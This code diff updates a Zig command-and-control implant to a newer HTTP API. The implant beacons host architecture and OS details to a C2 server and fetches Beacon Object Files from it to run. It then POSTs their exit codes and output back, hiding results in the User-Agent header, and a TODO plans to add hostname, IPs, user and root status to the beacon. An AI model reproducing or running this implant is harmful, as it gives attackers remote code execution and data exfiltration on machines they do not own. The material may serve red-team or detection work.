@@ -15,29 +15,28 @@ const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
 fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
-    var headers = std.http.Headers.init(allocator);
-    defer headers.deinit();
 
     const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
     defer allocator.free(uri);
 
     const bof_url = try std.Uri.parse(uri);
 
-    var bof_req = try state.http_client.open(.GET, bof_url, headers, .{});
+    var server_header_buffer: [1024]u8 = undefined;
+    var bof_req = try state.http_client.open(.GET, bof_url, .{ .server_header_buffer = &server_header_buffer });
     defer bof_req.deinit();
 
-    try bof_req.send(.{});
+    try bof_req.send();
     try bof_req.wait();
 
     if (bof_req.response.status != .ok) {
-        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
+        std.log.err("fetchBofContent: Expected response status '200 OK' got '{} {s}'", .{
             @intFromEnum(bof_req.response.status),
             bof_req.response.status.phrase() orelse "",
         });
         return error.NetworkError;
     }
 
-    const bof_content_type = bof_req.response.headers.getFirstValue("Content-Type") orelse {
+    const bof_content_type = bof_req.response.content_type orelse {
         std.log.err("Missing 'Content-Type' header", .{});
         return error.NetworkError;
     };
@@ -64,8 +63,7 @@ const State = struct {
     base64_decoder: std.base64.Base64Decoder,
     base64_encoder: std.base64.Base64Encoder,
     http_client: std.http.Client,
-    http_proxy: if (debug_proxy_port) std.http.Client.Proxy else void,
-    heartbeat_header: std.http.Headers,
+    heartbeat_authz: []u8,
     heartbeat_uri: std.Uri,
     pending_bofs: std.ArrayList(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
@@ -74,35 +72,28 @@ const State = struct {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
-        var heartbeat_header = std.http.Headers.init(allocator);
+        const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
+        const arch_name = target.cpu.model.name;
+        const os_name = @tagName(target.os.tag);
 
-        {
-            const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
-            const arch_name = target.cpu.model.name;
-            const os_name = @tagName(target.os.tag);
+        // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
+        const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
+        defer allocator.free(authz);
 
-            // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
-            const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
-            defer allocator.free(authz);
+        const heartbeat_authz = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
+        _ = std.base64.Base64Encoder.encode(&base64_encoder, heartbeat_authz, authz);
 
-            const authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
-            defer allocator.free(authz_b64);
-
-            _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
-            try heartbeat_header.append("Authorization", authz_b64);
-        }
-
-        const http_proxy = if (debug_proxy_port) blk: {
+        const http_proxy = if (debug_proxy_enabled) blk: {
             const proxy = try allocator.create(std.http.Client.Proxy);
             proxy.* = .{
-                .allocator = allocator,
-                .headers = heartbeat_header,
                 .protocol = .plain,
+                .authorization = null,
                 .host = debug_proxy_host,
                 .port = debug_proxy_port,
+                .supports_connect = true,
             };
             break :blk proxy;
-        } else {};
+        } else null;
 
         const http_client: std.http.Client = .{
             .allocator = allocator,
@@ -113,16 +104,16 @@ const State = struct {
             .base64_decoder = base64_decoder,
             .base64_encoder = base64_encoder,
             .http_client = http_client,
-            .heartbeat_header = heartbeat_header,
+            .heartbeat_authz = heartbeat_authz,
             .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
             .pending_bofs = std.ArrayList(PendingBof).init(allocator),
             .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
         };
     }
 
-    fn deinit(state: *State) void {
+    fn deinit(state: *State, allocator: std.mem.Allocator) void {
+        allocator.free(state.heartbeat_authz);
         state.http_client.deinit();
-        state.heartbeat_header.deinit();
         state.pending_bofs.deinit();
         state.persistent_bofs.deinit();
         state.* = undefined;
@@ -224,27 +215,37 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
 fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     // send heartbeat to C2 and check if any tasks are pending
-    var req = try state.http_client.open(.GET, state.heartbeat_uri, state.heartbeat_header, .{});
+    var server_header_buffer: [1024]u8 = undefined;
+    var req = try state.http_client.open(.GET, state.heartbeat_uri, .{
+        .server_header_buffer = &server_header_buffer,
+        .extra_headers = &.{
+            .{ .name = "authorization", .value = state.heartbeat_authz }
+        },
+    });
     defer req.deinit();
 
-    try req.send(.{});
+    try req.send();
     try req.wait();
 
     if (req.response.status != .ok) {
-        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
+        std.log.err("processCommands: Expected response status '200 OK' got '{} {s}'", .{
             @intFromEnum(req.response.status),
             req.response.status.phrase() orelse "",
         });
         return error.NetworkError;
     }
 
-    const content_type = req.response.headers.getFirstValue("Content-Type") orelse {
-        std.log.err("Missing 'Content-Type' header", .{});
-        return error.NetworkError;
-    };
+    var iter = req.response.iterateHeaders();
+    var content_type: std.http.Header = undefined;
+    while (iter.next()) |hdr| {
+        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
+            content_type = hdr;
+            break;
+        }
+    }
 
     // task received from C2?
-    if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
+    if (std.ascii.eqlIgnoreCase(content_type.value, "application/json")) {
         const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
         defer allocator.free(resp_content);
 
@@ -311,13 +312,15 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
             const result_str = try generateUserAgentString(allocator, bof_exit_code_or_launcher_error);
             defer allocator.free(result_str);
 
-            var headers = std.http.Headers.init(allocator);
-            defer headers.deinit();
-            try headers.append("Content-Type", "text/plain");
-            try headers.append("Authorization", pending_bof.request_id);
-            try headers.append("User-Agent", result_str);
-
-            var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
+            var server_header_buffer: [1024]u8 = undefined;
+            var request = try state.http_client.open(.POST, state.heartbeat_uri, .{
+                .server_header_buffer = &server_header_buffer,
+                .extra_headers = &.{
+                    .{ .name = "content-type", .value = "text/plain" },
+                    .{ .name = "user-agent", .value = result_str },
+                    .{ .name = "authorization", .value = pending_bof.request_id },
+                },
+            });
             defer request.deinit();
 
             if (pending_bof.context) |context| {
@@ -329,14 +332,14 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
                     request.transfer_encoding = .{ .content_length = out_b64.len };
 
-                    try request.send(.{});
+                    try request.send();
                     try request.writeAll(out_b64);
                     try request.finish();
 
                     std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                     std.log.info("Bof output sent:\n{s}", .{output});
                 } else {
-                    try request.send(.{});
+                    try request.send();
 
                     std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                 }
@@ -346,7 +349,7 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
                 context.release();
             } else {
-                try request.send(.{});
+                try request.send();
 
                 std.log.info("Bof launcher error code sent: {d}", .{bof_exit_code_or_launcher_error});
             }
@@ -364,7 +367,7 @@ pub fn main() !void {
     const allocator = gpa.allocator();
 
     var state = try State.init(allocator);
-    defer state.deinit();
+    defer state.deinit(allocator);
 
     try bof.initLauncher();
     defer bof.releaseLauncher();
